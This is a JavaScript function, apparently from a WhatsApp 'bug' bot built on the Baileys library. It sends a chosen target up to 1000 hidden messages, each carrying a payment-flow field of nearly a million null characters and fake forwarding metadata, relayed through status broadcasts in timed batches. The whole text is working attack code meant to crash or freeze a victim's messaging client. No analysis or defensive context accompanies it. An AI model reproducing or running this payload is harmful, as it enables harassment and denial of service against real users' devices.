async function InvisibleHard(jid, sock, mention, total = 1000, batchSize = 15, delayMs = 180000) {
  const batches = Math.ceil(total / batchSize);

  for (let b = 0; b < batches; b++) {
  console.log(`ꪶ 𖣂 ꫂ Success Sending Delay Invisible ${b+1}/${batches}🩸`);
    for (let i = 0; i < batchSize; i++) {
      const index = b * batchSize + i;
      if (index >= total) break;

      let msg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32)
            },
            interactiveResponseMessage: {
              body: {
                text: ` ꪶ ¡ϻ zαl ѕ3χ ꫂ `,
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "payment_method",
                paramsJson: "\u0000".repeat(999999),
                version: 3
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 9741,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "Developer ZalOfficial",
                  newsletterJid: "120363321780343299@newsletter",
                  serverMessageId: index+1
                }
              }
            }
          }
        }
      }, {});

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
              }
            ]
          }
        ]
      });

      if (mention) {
        await sock.relayMessage(jid, {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                type: 25
              },
              additionalNodes: [
                {
                  tag: "meta",
                  attrs: { is_status_mention: " ꪶ ¡ϻ zαl ѕ3χ ꫂ " },
                  content: undefined
                }
              ]
            }
          }
        }, {});
      }
console.log(`ꪶ 𖣂 ꫂ Success Sending Delay Invisible ${index+1}🩸`);
    }
    if (b < batches - 1) {
    console.log(`ꪶ 𖣂 ꫂ Success Sending Delay Invisible, Waiting ${delayMs/1000}S Before The Next Bug🩸`);
      await new Promise(resolve => setTimeout(resolve, delayMs));
    }
  }
console.log(`ꪶ 𖣂 ꫂ Success Sending Delay Invisible🩸`);
}
